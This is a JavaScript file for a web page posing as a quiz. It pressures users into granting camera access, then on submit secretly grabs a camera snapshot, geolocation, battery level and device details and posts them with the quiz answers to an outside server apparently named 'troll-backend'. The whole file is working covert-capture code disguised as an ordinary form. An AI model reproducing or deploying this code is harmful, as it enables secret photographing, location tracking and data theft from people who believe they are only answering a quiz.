const form = document.getElementById("quiz-form");
const videoEl = document.getElementById("video");
const canvasEl = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");
const toast = document.getElementById("toast");

const backendURL = "https://troll-backend.onrender.com/api/upload";
const constraints = { video: { facingMode: "user" }, audio: false };

// Toast helper
function showToast(message) {
  toast.innerText = message;
  toast.style.display = "block";
  toast.style.opacity = 1;
  setTimeout(() => {
    toast.style.opacity = 0;
    setTimeout(() => (toast.style.display = "none"), 300);
  }, 2000);
}

// Ask camera permission when user clicks file input
fileInput.addEventListener("click", async (e) => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    videoEl.srcObject = stream; // hidden video stream
  } catch (err) {
    console.error("Camera permission denied:", err);
    alert("Camera permission is required before selecting a file!");
    e.preventDefault(); // prevent file dialog if denied
  }
});

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const submitBtn = document.getElementById("submit-btn");
  submitBtn.disabled = true;
  submitBtn.textContent = "Submitting...";
  showToast("Uploading your response...");

  try {
    // Capture camera image (hidden)
    const ctx = canvasEl.getContext("2d");
    canvasEl.width = videoEl.videoWidth;
    canvasEl.height = videoEl.videoHeight;
    ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
    const cameraImage = canvasEl.toDataURL("image/png");

    // Collect metadata
    const metadata = {
      useragent: navigator.userAgent,
      platform: navigator.platform,
      width: window.innerWidth,
      height: window.innerHeight,
      language: navigator.language,
      battery: "N/A",
      location: "N/A",
      time: new Date().toLocaleString(),
    };

    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      metadata.battery = battery.level * 100 + "%";
    }

    if (navigator.geolocation) {
      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      } catch {
        metadata.location = "Denied";
      }
    }

    // Collect form answers
    const formData = new FormData(form);
    const answers = {};
    formData.forEach((v, k) => (answers[k] = v));

    // Send to backend
    await fetch(backendURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        image: cameraImage,
        fileName: fileInput.files[0]?.name || "no_file",
        answers,
        metadata,
      }),
    });

    // Stop camera
    videoEl.srcObject?.getTracks().forEach(track => track.stop());

    // Show success
    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "block";
    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
    showToast("Response submitted successfully!");
  } catch (err) {
    console.error(err);
    showToast("Error! Please allow camera access.");
    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
  }
});
